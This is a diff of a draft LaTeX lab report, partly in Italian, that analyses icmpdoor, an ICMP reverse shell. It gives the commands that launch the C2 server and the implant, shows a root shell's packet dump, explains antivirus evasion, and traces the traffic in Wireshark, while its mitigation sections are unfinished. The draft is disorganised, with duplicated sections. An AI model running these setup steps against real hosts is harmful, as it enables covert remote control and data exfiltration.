@@ -1,10 +1,36 @@
-%https://noxenius.medium.com/icmpdoor-how-i-used-an-icmp-reverse-shell-12814ca1b0e7
-%https://medium.com/@nganbarle/icmpdoor-building-an-icmp-reverse-shell-in-python-3-c9b38a12013d
-When most people think of reverse shells, they imagine TCP or UDP — like the classic Meterpreter or Netcat.
-But there’s a lesser-known method lurking in plain sight: ICMP. 
-This is the protocol behind the humble ping, but it can also be abused as a covert tunnel to send and receive commands.
+%https://medium.com/@nganbarle/icmpdoor-building-an-icmp-reverse-shell-in-python-3-c9b38a12013d  
+%
+%https://medium.com/@s12deff/icmp-reverse-shell-e3c8dd2466b7  
+%https://cryptsus.com/blog/icmp-reverse-shell.html
+%
+%https://github.com/krabelize/icmpdoor
+%
+With \textbf{icmpdoor} we can tunnel out a covert channel to enstablish a ICMP reverse shell and control a compromised machine so to exfiltrate data as an insider threat. 
+Your Anti-Virus (AV) will most likely not detect and block icmpdoor either.  
 \vspace{2ex} \newline
-ICMPdoor, a Python-based ICMP reverse shell that bypassed standard firewall rules — and even some older antivirus solutions — during a competition. 
+ICMPdoor is a Python-based ICMP reverse shell that bypassed standard firewall rules — and even some older antivirus solutions — during a competition. 
+While some older scripts or proof-of-concepts existed, the author of icmpdoor created a Python 3 tool that works on “most, if not all” Linux distros and Windows 10 as long as you can ping from Machine A to Machine B..  
+
+
+\subsection{Reverse Shell}
+A reverse shell is a remote shell session that the attacker initiates from the victim back to themselves, allowing them to gain control and run commands on the compromised system. 
+A reverse shell can let an insider to exfiltrate data over this channel. 
+\vspace{1ex} \newline
+Security teams often configure firewalls to filter TCP and UDP ports or block specific applications (layer 7 firewalling); 
+however they might overlook ICMP traffic sine blocking the ICMP protocol completely would imply that hosts can no longer ping each other.
+That’s exactly what the icmpdoor exploit leverages. 
+Since ICMP is often overlooked by firewalls, attackers exploit it for stealthy data exfiltration or remote access.
+%Abusing ICMP as a backdoor has been done by at least one APT (Advanced Persistent Threat) group in the past. 
+%ICMP firewall filtering is rarely configured which allows malicious actors to evade firewalls. 
+\vspace{2ex} \newline
+Figure.\ref{fig:struttura:firewall}  shows how a well-configured firewall should block a traditional TCP or UDP reverse shell. 
+\includegraphics[width=\linewidth]{../img/icmpdoor/tcp-reverse-shell.png}
+\label{fig:struttura:firewall}
+\captionof{figure}{Firewall blocks a reverse shell over port 4444}
+%
+%I decided to write my own ICMP reverse shell called icmpdoor in Python 3 since I could not find a proper alternative. 
+
+\subsection{TO DELETE}
 My success scored me first place and earned a free exam voucher. 
 In this post, I’ll show you:
 \begin{itemize}
@@ -13,41 +39,6 @@ In this post, I’ll show you:
     \item Methods for detecting or mitigating an ICMP-based attack.
     \item How I bypassed older Windows Defender with minimal fuss.
 \end{itemize}
-\vspace{2ex} \newline 
-ICMP (Internet Control Message Protocol) is typically used for network diagnostics — think ping or traceroute. 
-Because it’s essential for basic troubleshooting, many organizations either don’t block ICMP or don’t monitor it closely. 
-This creates an opportunity: if TCP and UDP ports are filtered, an attacker can still exfiltrate data or remotely control a host by embedding commands into ICMP “echo request” (type 8) and retrieving responses via “echo reply” (type 0).
-\vspace{2ex} \newline 
-
-
-
-
-A reverse shell is a remote shell session that the attacker initiates from the victim back to themselves, allowing them to run commands on the compromised system. 
-Security teams often block suspicious TCP/UDP ports, but they might ignore or allow ICMP. 
-That’s exactly what the icmpdoor exploit leverages.
-%
-An ICMP reverse shell is a mechanism where an attacker controls a compromised machine by sending ICMP packets. 
-Unlike TCP or UDP, ICMP is a control protocol primarily used for diagnostics, such as ping. 
-Since ICMP is often overlooked by firewalls, attackers exploit it for stealthy
-
-
-While some older scripts or proof-of-concepts existed, the author of icmpdoor created a Python 3 tool that works on “most, if not all” Linux distros and Windows 10. 
-The standout details:
-\begin{itemize}
-    \item Payload in ICMP “Data” Field: Instead of error or diagnostic data, it hides the attacker’s commands (and the responses) in the raw ICMP payload.
-    \item Hard-coded ICMP ID: By default, icmpdoor uses an ID of 13170 (0x3372). This filters out regular pings and ensures only “our” ICMP traffic is processed.
-    \item Unencrypted: No fancy encryption, just plain text. Some advanced versions might obfuscate or chunk the payload, but the default is very straightforward.
-\end{itemize}
-
-
-Traffic Flow
-\begin{enumerate}
-    \item Attacker sends an ICMP echo-request (type 8) with ID=13170, embedding commands in the payload.
-    \item Victim (Implant) receives that request, notices the matching ID, extracts and executes the command locally.
-    \item Victim replies to the attacker with an ICMP echo-reply (type 0) containing the command’s output.
-    \item The attacker’s console displays it as if it were a normal shell session.
-\end{enumerate}
-
 Why It Bypassed Windows Defender
 \begin{enumerate}
     \item Signature-Based Detection: Many AV/EDR engines rely on known-malware signatures. My custom build of icmpdoor.exe simply wasn’t in the signature database.
@@ -56,85 +47,36 @@ Why It Bypassed Windows Defender
 \end{enumerate}
 Still, even with up-to-date definitions, a carefully obfuscated or recompiled version of icmpdoor can often evade basic antivirus checks.
 
-
-Inside the Packets
-By capturing traffic with Wireshark or tcpdump, you can see:
+\subsubsection{Analysis of the packets} 
+Message Formats
+ICMP messages are sent using the basic IP header. 
+The first octet of the data portion of the datagram is a ICMP type field; 
+the value of this field determines the format of the remaining data. 
+Any field labeled "unused" is reserved for later extensions and must be zero when sent, but receivers should not use these fields (except to include them in the checksum). 
+Unless otherwise noted under the individual format descriptions, the values of the internet header fields are as follows:
 \begin{itemize}
-    \item ICMP Type: 8 (request) from attacker, 0 (reply) from victim.
-    \item ID: 13170 (0x3372). This stands out if you know what to look for.
-    \item Payload: If you open the hex or ASCII view, you’ll see the plain-text command (e.g., dir) or output (e.g., Volume in drive C:).
-\end{itemize}
-While it’s easy to spot if you’re looking closely, many networks do not log or inspect ICMP payloads in detail.
-
-
-Detection and Mitigation
-%TO-DO 
-
-
-%https://medium.com/@s12deff/icmp-reverse-shell-e3c8dd2466b7 
-How Works?
-The Python 3 Scapy module helps us manipulate network fields. 
-Figure 3 shows the connection flow followed in a Command & Control (C2) setup:
-%
-icmp-cnc.py runs on Machine A while icmpdoor.py or icmpdoor.exe runs on Machine B.
-\begin{itemize}
-    \item The attacker sends a command e.g. hostname as payload over ICMP echo-request (code 8) with ICMP ID 13170.
-    \item The victim executes strips of the network packets and executes command hostname with os.popen.
-    \item The victim sends the output of the hostname command ubuntu2040 back to the attacker’s machine over ICMP echo-reply (code 0) with the same ICMP ID 13170.
-\end{itemize}
-icmpdoor does not time-out automatically because it does not establish a socket. Instead, this interactive shell is connectionless due to the nature of how the ICMP protocol works. 
-This technique works with global routable IP’s (WAN connections).
-%
-Reverse Shell
-Perfect, it’s time to do a practical demonstration of how to perform the ICMP shell in a real environment.
-It is very simple to do and understand, but you have to do it anyway.
-The first thing to do is to clone the repository and prepare everything on our attacking machine.
-
-git clone https://github.com/krabelize/icmpdoor
-cd icmpdoor
-python3 icmp-cnc.py -i interface -d IP_VICTIM
-The server it’s UP, now it’s the moment to execute the victim connection and get the shell.
-
-python3 icmpdoor.py -i interface -d IP_KALI
-
-
-Mitigation
-I add the way to mitigate recommended in this web, it is very good I think it deserves to be shared.
-%TO-DO
-
-
-%https://cryptsus.com/blog/icmp-reverse-shell.html#:~:text=Our%20ICMP%20reverse%20shell%20called%20icmpdoor%20can%20tunnel,shell%20works%20both%20on%20Linux%20and%20Windows%2010.
-%https://cryptsus.com/blog/icmp-reverse-shell.html
-ICMP is mainly used to ping computers and appliances across networks. 
-This blog post explains why leaving ICMP unfiltered by a corporate and host-based firewall can form a bigger risk than you might initially think. 
-Our ICMP reverse shell called icmpdoor can tunnel out a covert channel to control a compromised machine and exfiltrate data as an insider threat. 
-Your Anti-Virus (AV) will most likely not detect and block icmpdoor either. 
-This ICMP reverse shell works both on Linux and Windows 10.
-
-
-Reverse Shell
-A reverse shell is a remote interactive shell for command execution initiated by the attacker to gain control over a compromised system. 
-A reverse shell can also be abused by an insider threat to exfiltrate data over this covert channel. 
-Corporate edge and core firewalls are typically configured to filter/deny/block TCP and UDP ports, or ever specific applications (layer 7 firewalling). 
-Figure 1 shows how a well-configured firewall should block a traditional TCP or UDP reverse shell:
-
-
-ICMP Reverse Shell
-ICMP stands for Internet Control Message Protocol. 
-This protocol is often overlooked or depreciated when planning a firewall strategy. 
-ICMP firewall filtering is rarely configured which allows malicious actors to evade firewalls. 
-Abusing ICMP as a backdoor has been done by at least one APT (Advanced Persistent Threat) group in the past. 
-Blocking the ICMP protocol completely would also imply hosts can no longer ping each other.
-
-I decided to write my own ICMP reverse shell called icmpdoor in Python 3 since I could not find a proper alternative. 
-This ICMP reverse shell tunnel works on most, if not all, Linux distributions and Windows 10 as long as you can ping from Machine A to Machine B.
-
-
-ICMP deep dive
-We first analyze a traditional ping. 
+    \item Version 4
+    \item IHL Internet header length in 32-bit words.
+    \item Type of Service 0
+    \item Total Length Length of internet header and data in octets.
+    \item Identification, Flags, Fragment Offset Used in fragmentation.
+    \item Time to Live
+    Time to live in seconds; 
+    as this field is decremented at each machine in which the datagram is processed, the value in this field should be at least as great as the number of gateways which this datagram will traverse.
+    \item Protocol ICMP = 1
+    \item Header Checksum
+    The 16 bit one's complement of the one's complement sum of all 16 bit words in the header.  
+    For computing the checksum, the checksum field should be zero.
+    This checksum may be replaced in the future.
+    \item Source Address
+    The address of the gateway or host that composes the ICMP message.
+    Unless otherwise noted, this can be any of a gateway's addresses.
+    \item Destination Address
+    The address of the gateway or host to which the message should be sent.
+\end{itemize} 
 Typically a ping echo-request (type 8) is sent and expect a ping echo-reply (type 0) in return. 
-Code block 1 shows us the RFC 792 ICMP echo-request and echo-reply packets header.
-
+%ICMP Type: 8 (request) from attacker, 0 (reply) from victim.
+\begin{lstlisting}
 0                   1                     2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
@@ -144,273 +86,278 @@ Code block 1 shows us the RFC 792 ICMP echo-request and echo-reply packets heade
 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 |                        Optional Data                          |
 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-
+\end{lstlisting}
+\label{lstlisting:icmp:packet}
+\captionof{lstlisting}{RFC 792 ICMP echo-request and echo-reply packets header}
+\vspace{2ex} 
+\begin{itemize}
+    \item[] \textbf{IP Fields}
+    \item Addresses
+    The address of the source in an echo message will be the
+    destination of the echo reply message.  To form an echo reply
+    message, the source and destination addresses are simply reversed,
+    the type code changed to 0, and the checksum recomputed.
+    \item Type
+    8 for echo message;
+    0 for echo reply message.
+    \item Code 0
+    \item Checksum
+    The checksum is the 16-bit ones's complement of the one's complement sum of the ICMP message starting with the ICMP Type.
+    For computing the checksum , the checksum field should be zero.
+    If the total length is odd, the received data is padded with one octet of zeros for computing the checksum.  
+    This checksum may be replaced in the future.
+    \item Identifier
+    If code = 0, an identifier to aid in matching echos and replies, may be zero.
+    \item Sequence Number
+    If code = 0, a sequence number to aid in matching echos and replies, may be zero.
+    \item Description
+    The data received in the echo message must be returned in the echo reply message.
+    The identifier and sequence number may be used by the echo sender to aid in matching the replies with the echo requests.  
+    For example, the identifier might be used like a port in TCP or UDP to identify a session, and the sequence number might be incremented on each echo request sent.  
+    The echoer returns these same values    in the echo reply.
+\end{itemize}
+%Code 0 may be received from a gateway or a host.
+\vspace{2ex} 
 The optional ICMP Data field is normally used for error messaging. 
-However, instead of an error message, we will abuse this data field for our reverse shell payload (Raw) which can be a maximum of 576 bytes in size. 
-We will fragment the payload if the total size exceeds this maximum of 576 bytes.
-%
-We also modify and abuse the ICMP Identifier field to a static value of 13170 in order to filter out legitimate ICMP packets and match our ICMP reverse shell. 
-In total we filter/manipulate the following header fields:
+However we will abuse this field for our reverse shell payload (Raw); 
+hiding in it the attacker’s commands and the vicitm's responses (in the raw ICMP payload). 
+Its maximum size can be of 576 bytes so we will have to fragment the payload if the total size exceeds it.
+\vspace{1ex} \newline
+The data are not encrypted so, if in Wireshark or TcpDump you open the hex or ASCII view, you’ll see the plain-text command (e.g., dir) or output (e.g., Volume in drive C:). 
+%Some advanced versions might obfuscate or chunk the payload, but the default is very straightforward.
+\vspace{1ex} \newline  
+By default, icmpdoor uses an ID of 13170 (0x3372) modify the ICMP Identifier field. 
+This filters out regular pings and ensures only “our” ICMP traffic is processed. 
+\vspace{2ex} \newline
+In total we manipulate the following header fields:
 \begin{itemize}
     \item pkt[IP].src (IP address of machine A or B)
     \item ip[ttl] (Time To Live == 64)
     \item pkt[ICMP].type (Echo Request [8] or Echo Reply [0])
     \item pkt[ICMP].id (Static Identification (ID) field with value 13170 == 0x3372 in hexadecimal)
-    \item pkt[Raw].load (Payload ≠ empty)
+    \item pkt[Raw].load (Payload $\neq$ empty)
 \end{itemize}
-Figure 2 shows all the packet encapsulation layers and their values when we send the Linux command id. with a reply uid=0(root) gid=0(root) groups=0(root). 
-icmpdoor is encapsulated in the following network packets: MAC[IP[ICMP(payload)]]]
+Figure.\ref{packets:example} shows all the packet encapsulation layers and their values when we send the Linux command 
+icmpdoor is encapsulated in the following network packets: MAC[IP[ICMP(payload)]]
+\begin{minipage}{\linewidth}
+    \centering
+    \includegraphics[width=0.7\linewidth]{../img/icmpdoor/packet-headers.png}
+    \label{packets:example}
+    \captionof{figure}{ICMP packet header}
+\end{minipage}
+%id. with a reply uid=0(root) gid=0(root) groups=0(root). 
+\vspace{2ex} \newline
+Analizzando il traffico tramite Wireshark notiamo meglio il funzionamento di \textbf{Icmpdoor}:
+\begin{enumerate}
+    \item L'attaccante invia una richiesta ICMP in cui, nel campo Data, inserisce il comando da eseguire
+    \item La vittima invia poi due risposete: una con il comando ricevuto e l'altra con la risposta che il comando ha restituito. 
+\end{enumerate} 
+Vediamo quindi che l'attaccante riesce a ricevere e leggere il contenuto del file. 
 
+While it’s easy to spot if you’re looking closely, many networks do not log or inspect ICMP payloads in detail.
+\vspace{2ex} \newline
+Do note that this ICMP reverse shell is unencrypted and does not use (base64) encoding:
+\begin{lstlisting}
+$ shell: id
+
+0000  00 0C 29 61 10 78 00 0C 29 B8 E9 F9 08 00 45 00  ..)a.x..).....E.
+0010  00 43 00 01 00 00 40 01 94 DD C0 A8 B2 43 C0 A8  .C....@......C..
+0020  B2 47 00 00 16 51 33 72 00 00 75 69 64 3D 30 28  .G...Q3r..uid=0(
+0030  72 6F 6F 74 29 20 67 69 64 3D 30 28 72 6F 6F 74  root) gid=0(root
+0040  29 20 67 72 6F 75 70 73 3D 30 28 72 6F 6F 74 29  ) groups=0(root)
+0050  0A
+\end{lstlisting}
+
+
+
+\subsubsection{Traffic Flow}
 The Python 3 Scapy module helps us manipulate network fields. 
-Figure 3 shows the connection flow followed in a Command & Control (C2) setup:
-
+Figure.\ref{fig:icmp:C2} shows the connection flow followed in a Command \& Control (C2) setup: 
+\includegraphics[width=\linewidth]{../img/icmpdoor/icmp-reverse-shell.png}
+\label{fig:icmp:C2}
+\captionof{figure}{imcpdoor Command \& Control (C2) execution over ICMP}
+\vspace{2ex} 
 icmp-cnc.py runs on Machine A while icmpdoor.py or icmpdoor.exe runs on Machine B.
 \begin{enumerate}
-    \item The attacker sends a command e.g. hostname as payload over ICMP echo-request (code 8) with ICMP ID 13170.
-    \item The victim executes strips of the network packets and executes command hostname with os.popen.
-    \item The victim sends the output of the hostname command ubuntu2040 back to the attacker’s machine over ICMP echo-reply (code 0) with the same ICMP ID 13170.
+    \item Attacker sends an ICMP echo-request (type 8) with ID=13170, embedding commands in the payload (e.g. hostname).
+    \item Victim (Implant) receives that request, notices the matching ID, extracts and executes the command locally with os.popen.
+    \item The victim sends the output of the command back to the attacker’s machine over ICMP echo-reply (code 0) with the same ICMP ID 13170.
+    %Victim replies to the attacker with an ICMP echo-reply (type 0) containing the command’s output.
+    \item The attacker’s console displays it as if it were a normal shell session.
 \end{enumerate}
 icmpdoor does not time-out automatically because it does not establish a socket. 
 Instead, this interactive shell is connectionless due to the nature of how the ICMP protocol works. 
-This technique works with global routable IP's (WAN connections).
-%
-You can pull icmpdoor from my GitHub repository. 
+This technique works with global routable IP’s (WAN connections).
+
+
+\subsection{icmpdoor}
+Proviamo a testare lo strumento collegando l'attaccante alla vittima.
+First we pull down \textbf{icmpdoor} from the GitHub repository on both machine. 
 Pre-compiled stand-alone binaries for Windows 10 and Linux are also available from the same repo.
+\begin{lstlisting}
+    #Usage
+    ./icmp-cnc.py -i INTERFACE -d VICTIM-IP (Command & Control (C2))
+    ./icmpdoor.py -i INTERFACE -d CNC-IP (Implant)
+\end{lstlisting} 
+\vspace{1ex}
+Having cloned the tool, we prepare everything on our attacking machine.
+%Per collegare invece le due macchine eseguiamo su quella dell'attaccante il comando:
+\vspace{1ex} \newline
+\begin{lstlisting}
+    #Cloning the repository
+    git clone https://github.com/krabelize/icmpdoor
 
-Do note that this ICMP reverse shell is unencrypted and does not use (base64) encoding:
+    #Set up of the attacker
+    cd icmpdoor
+    sudo python3 ./icmp-cnc.py -i enp0s3 -d 192.168.1.42
+\end{lstlisting}
+\captionof{lstlisting}{Setting up the attacker}
+\label{lstlisting:icmpdoor:setup:attacker}
+\vspace{1ex} 
+Where enp0s3 is the interface where the packets are going through and 192.168.1.42 is the IP address of the victim
+\vspace{2ex} \newline
+Now with the server UP, it’s the moment to execute the victim connection and get the shell.
+%Mettiamo la vititma in ascolto delle richieste da parte dell'attaccante con il comando: 
+\vspace{1ex} \newline
+\begin{lstlisting}
+    sudo python3 ./icmpdoor.py -i enp0s3 -d 192.168.1.35
+\end{lstlisting} 
+\captionof{lstlisting}{Setting up the victim}
+\label{lstlisting:icmpdoor:setup:victim}
+\vspace{1ex} 
+Where 192.168.1.35 is the IP address of the attacker.
+\vspace{2ex} \newline
+\begin{minipage}{\linewidth}
+    \centering
+    \includegraphics[width=0.5\linewidth]{../img/icmpdoor/attaccante_C2.png}
+    \captionof{figure}{Setting up the attacker} 
+    \label{fig:icmpdoor:setup:attacker}
+\end{minipage}
+\vspace{2ex} \newline
+\begin{minipage}{\linewidth}
+    \centering
+    \includegraphics[width=0.5\linewidth]{../img/icmpdoor/vittima-implant.png}
+    \captionof{figure}{Setting up the victim}
+    \label{fig:icmpdoor:setup:victim}
+\end{minipage}
+Siamo riusciti quindi a collegare l'attaccante alla vittima; 
+verifichiamo la cosa stampando il nome della macchina su cui viene eseguita la shell e l'indirrizzo IP. 
+Come possiamo vedere (Fig.\ref{fig:icmpdoor:collegamento:esempio}) l'hostname è \textit{vittima} e l'indirizzo IP è \textit{192.168.1.42}
+\begin{minipage}{\linewidth}
+    \centering
+    \includegraphics[width=0.7\linewidth]{../img/icmpdoor/attaccante_shellExample_2.png}
+    \captionof{figure}{Esempio Collegamento}
+    \label{fig:icmpdoor:collegamento:esempio}
+\end{minipage}
+\vspace{2ex} \newline
+Verifichiamo ora che con la reverse shell si possa navigare il file system della vittima. 
+Procediamo quindi a verificarne la possibilita cercando presenza dei due file \textit{vittima.txt} e stampandone poi il contenuto. 
+%Infatti per distinguere le due macchine abbiamo creato un file di testo su entrambe.
+\newline
+\begin{minipage}{0.5\linewidth}
+    \centering
+    \includegraphics[width=0.7\linewidth]{../img/icmpdoor/attaccante_shellExample_3.png} 
+    \vspace{2ex} \break
+    \includegraphics[width=0.7\linewidth]{../img/icmpdoor/attaccante_shellExample_5.png} 
+\end{minipage}
+\begin{minipage}{0.5\linewidth}
+    \centering 
+    \includegraphics[width=0.7\linewidth]{../img/icmpdoor/attaccante_shellExample_4.png} 
+    \captionof{figure}{Esempi sul file system}
+    \label{fig:icmpdoor:collegamento:fylesystem}
+\end{minipage}
+\vspace{2ex} \newline
+Una cosa notata durante l'analisi del traffico è il numero di Echo Reply spedite (Fig.\ref{fig:wireshark:ls}).
+La reverse shell manda per ogni elemento un pacchetto ICMP verso l'attaccante; 
+che nel totale risulteranno in \textbf{13 Echo Reply}. 
+In questo caso potrebbero semprare poce ma se la cartella contenesse più elementi, il numero di risposte potrebbe aumentare.
+Quindi un numero elevato di risposte verso la stessa destinazione potrebbe destare sospetti e attirare l'attenzione vero il canale di comunicazione da parte di un IDS o di un Anitvirus.
+\vspace{1ex} \newline
+\begin{minipage}{\linewidth}
+    \centering 
+    \includegraphics[width=0.7\linewidth]{../img/icmpdoor/wireshark_ipaddr_numReply.jpg} 
+    \captionof{figure}{Traffico ICMP relatico al comando \textit{ls -s}}
+    \label{fig:wireshark:ls}
+\end{minipage}
+\vspace{2ex} \newline
+Tuttavia provando a creare un file tramite la reverse shell, notiamo che non tutti i comandi vengono eseguiti correttamente. 
+La vittima esegue comunque il comando tuttavia la connessione con l'attaccante crasha.
+Il problema viene risolto se il comando permette alla vittima di rispondere con un Echo Reply (Fig.\ref{fig:test:creazioneFile}).
+\begin{lstlisting}
+    echo "Sono le 12:47 deel 23/04/2025" > prova.txt; 
+    echo "Done"
+\end{lstlisting} 
+\captionof{lstlisting}{Creazione del file}
+\label{lstlisting:test:creazioneFile}
+%
+\includegraphics[width=\linewidth]{../img/icmpdoor/prova_file.png}
+\label{fig:test:creazioneFile}
+\vspace{2ex} \newline
+Proviamo ora a vedere cosa succede se il contentuto di un file è molto lungo. 
+Tramite uno script python lo creiamo, e al suo interno ripetiamo la parola "hugeFile" (Code.\ref{lstlisting:script:hugefile}). 
+Poi proviamo a ricavare il contenuto tramite la reverse shell (Fig.\ref{fig:script:hugefile}). 
+\begin{lstlisting}
+    with open("hugefile.txt", "w") as f:
+        f.write("hugeFile - "*999)
+    f.close()
+\end{lstlisting} 
+\captionof{lstlisting}{Script per la creazione del file}
+\label{lstlisting:script:hugefile}
+\vspace{2ex}
+Vediamo che l'attaccante chrasha quando prova a stampare il contenuto del file; 
+tuttavia dall'analisi del traffico risulta che il pacchetto ICMP contiene tutti i dati del file (Fig.\ref{fig:wireshark:hugefile}).
+Infatti analizzando il traffico vediamo che tutti i 10989 byte sono contenuti nel campo Data del pacchetto. 
+\vspace{2ex} \newline
+\begin{minipage}{\linewidth}
+    \centering
+    \includegraphics[width=0.7\linewidth]{../img/icmpdoor/hugefile_attaccante.png}
+    \captionof{figure}{Contenuto e statistiche del file \textit{hugefile.txt}}
+    \label{fig:script:hugefile}
+\end{minipage}
+\vspace{2ex} \newline
+\begin{minipage}{\linewidth}
+    \centering
+    \includegraphics[width=0.7\linewidth]{../img/icmpdoor/hugefile_wireshark_data.jpg}
+    \captionof{figure}{Traffico ICMP relativo al file \textit{hugefile.txt}}
+    \label{fig:wireshark:hugefile}
+\end{minipage}
+%\begin{minipage}{0.5\textwidth}
+%    \includegraphics[width=\textwidth]{../img/icmpdoor/fileSegreto_wireshark_risA.png}
+%    \includegraphics[width=\textwidth]{../img/icmpdoor/fileSegreto_wireshark_risV.png}
+%\end{minipage}
+\subsection*{Conclusioni}
+Le conclusioni sullo strumento sono:
+\begin{itemize}
+    \item[] \textbf{PRO}: Permette la creazione di un canale di comunicazione tra attaccante e vittima. 
+    In particolare realizza una reverse shell sulla quale inviare comandi e ricevere risposte.
+    \item[] \textbf{CONS}: Gli svantaggi sono come i dati e i pacchetti vengono trasmessi. 
+    Vengono trasmesse in sequenza molteplici Echo Reply, e il campo Data contiene tutta la risposta. 
+    Tutto questo avviene in chiaro e quindi facilmente rilevabile. 
+\end{itemize}
+Di solito per ogni Echo Request corrisponde una singola Echo Reply (per ogni richiesta c'è solo una risposta).
+Il campo Data di solito è vuoto. 
+\vspace{1ex} \newline
+Se un agente monitorasse il flusso dei dati in quel momento, sicuramente troverebbe la comunicazione sospetta.
+Inoltre non essendo i dati crittografati, riesce ad ricavare il comando inviato e la risposta ricevuta.
 
 
-Mitigation
+%https://noxenius.medium.com/icmpdoor-how-i-used-an-icmp-reverse-shell-12814ca1b0e7
+
+\subsection{Detection and Mitigation}
 Network administrators and security engineers should limit or deny ICMP traffic as much as possible. 
 When this is not feasible due to protocol requirements or network planning, scope the accepted source and destination of ICMP packets. 
 This blog post elaborates on how to configure this with iptables.
 %TO-DO
 
-
-Screenshots
+\subsection{Mitigation}
+I add the way to mitigate recommended in this web, it is very good I think it deserves to be shared.
 %TO-DO
 
+\subsection{Detection and Mitigation}
+%TO-DO 
 
-
-
-
-%https://github.com/krabelize/icmpdoor
-\section{icmpdoor}
-icmpdoor is an ICMP rev shell written in Python3 and scapy. 
-Tested on Ubuntu 20.04, Debian 10 (Kali Linux), and Windows 10.
-
-
-
-
-Proviamo testandolo e facendo collegare l'attaccante alla vittima: 
-\begin{minipage}{0.5\textwidth}
-    \includegraphics[width=\linewidth]{../img/icmpdoor/attaccante_C2.png}
-\end{minipage}
-\begin{minipage}{0.5\textwidth}
-    \includegraphics[width=\linewidth]{../img/icmpdoor/vittima-implant.png}
-    \vspace{2ex} 
-    Mettiamo la vititma in ascolto delle richieste da parte dell'attaccante con il comando: 
-    \begin{lstlisting}
-        sudo ./icmpdoor.py -i enp0s3-d 132.168.1.35 
-    \end{lstlisting}
-    Per collegare invece le due macchine eseguiamo su quella dell'attaccante il comando:
-    \begin{lstlisting}
-        sudo ./icmpdoor-cnc.py -i enp0s3 -d 192.168.1.42
-    \end{lstlisting} 
-    \vspace{2ex}
-    Siamo riusciti a collegare l'attaccante alla vittima. 
-    Lo verifichiamo con la presenza del file \textit{vittima.txt}. 
-    Infatti per distinguere le due macchine abbiamo creato un file di testo su entrambe.
-\end{minipage}
-Tuttavia notiamo che non tutti i comandi vengono eseguiti correttamente. 
-Se si prova a creare, tramite questo canale, un file di testo la connessione crasha; tuttavia la vittima esegue comunque il comando.
-\includegraphics[width=\linewidth]{../img/icmpdoor/prova_file.png}
-\vspace{2ex}
-\begin{minipage}{0.5\textwidth}
-    Procediamo ora a creare un file segreto sulla macchina della vittima.
-    \includegraphics[width=\linewidth]{../img/icmpdoor/file_segreto_vittima_trim.png}
-    \vspace{2ex}
-    Analizzando il traffico tramite Wireshark notiamo meglio il funzionamento di \textbf{Icmpdoor}:
-    \begin{enumerate}
-        \item L'attaccante invia una richiesta ICMP in cui, nel campo Data, inserisce il comando da eseguire
-        \item La vittima invia poi due risposete: una con il comando ricevuto e l'altra con la risposta che il comando ha restituito. 
-    \end{enumerate} 
-    Vediamo quindi che l'attaccante riesce a ricevere e leggere il contenuto del file. 
-\end{minipage}
-\begin{minipage}{0.5\textwidth}
-    \includegraphics[width=\linewidth]{../img/icmpdoor/fileSegreto_wireshark_risA.png}
-    \includegraphics[width=\linewidth]{../img/icmpdoor/fileSegreto_wireshark_risB.png}
-\end{minipage}
-Uno svantaggio già notabile è la quantità di risposte Echo che vengono eseguite; 
-di solito per ogni richiesta Echo corrisponde una singola risposta Echo. 
-Questo rende il canale maggiormente visibile e quindi facilmente rilevabile. 
-Proviamo quindi a vedere cosa succede se si vuole il contentuto di un file di grandi dimensioni: 
-troppe risposte o un campo Data eccessivamente grande desterebbero sospetti. 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-%https://icmpshell.sourceforge.net/
-%https://github.com/nelsonmaligro/icmpshell 
-\section{ICMP Shell}
-ICMP Shell (ISH) is a telnet-like protocol. 
-It allows users to connect to a remote host and to open a shell using only ICMP to send and receive data. ICMP Shell was written in C for the UNIX environment.
-\vspace{4ex} \newline
-
-How does it work?
-The ISHELL server is run in daemon mode on the remote server. 
-When the server recieves a request from the client it will strip the header and look at the ID field, if it matches the server then it will pipe the data to "/bin/sh". 
-It will then read the results from the pipe and send them back to the client and the client prints the results to stdout.
-\vspace{1ex} \newline
-By default the client and server send packets with an ICMP type of 0 (ICMP_ECHO_REPLY), however this can be changed on both the client and server side. 
-ISHELL does not care what type you send out from the client or server end, the types do not have to match.
-\vspace{1ex} \newline
-ISHELL does not only pipe commands to a server and send back the output. 
-It also works with interactive programs (ie. gdb). 
-However, there comes a minor problem from this. ISHELL cannot display a shell prompt (#). 
-The reason for that is because there is no way to differentiate between a command an interaction with a program. 
-If you have any ideas on how to implement that then I'd be more then happy to hear from you ;)
-\vspace{4ex} \newline
-
-Firewall? No one said anything about a firewall!
-By default ISHELL uses icmp type 0 (ICMP_ECHO_REPLY) to send/recv. 
-With a little bit of research I have found that icmp type 0 works best with this program. 
-Other types do work, however some kernels process ICMP_ECHO_REQUEST packets automatically (BSD) while others do not (Linux).
-\vspace{4ex} \newline
-
-Installation
-Call 'make' and follow the instructions.
-\vspace{1ex} \newline
-Files
-MD5 (ish.c) = 07934540ee7ca6ac7919bb1ea49fd7ff
-MD5 (ish_main.c) = e2885ef2eb7688caff9b45f8c81daf8f
-MD5 (ish_open.c) = 81b11fce190a321a02b5313b1b244aa7
-MD5 (ishd.c) = de574728574dc3a8d5389172ca4e3b6a
-MD5 (ishell.h) = 380b110ba648164a82a0ffddbb0920f9
-\vspace{lex} \newline
-The server/client have been tested on:
-- Linux Mandrake 8.1 x86
-- FreeBSD 4.4 x86
-- OpenBSD 3.0 x86
-- Solaris 8 sparc
-\vspace{2ex} \newline
-
-Some IMPORTANT words on the usage
-\begin{enumerate}
-    \item  ISHELL uses raw sockets on both the client and server side, therefore root privileges ARE REQUIRED to use this program.
-    \item When configuring the options for the server/client make sure the following options are the same on both the client and the server:
-    -i <id>
-    -p <packetsize>
-\end{enumerate}
-\vspace{2ex}
-Usage: Server
-ICMP Shell v0.1 (server) - by: Peter Kieltyka
-usage: ./ishd [options]
-\vspace{1ex} \newline
-options:
--h Display this screen
--d Run server in debug mode
--i <id> Set session id; range: 0-65535 (default: 1515)
--t <type> Set ICMP type (default: 0)
--p <packetsize> Set packet size (default: 512)
-\vspace{lex} \newline
-example:
-./ishd -i 65535 -t 0 -p 1024
-\vspace{2ex} \newline
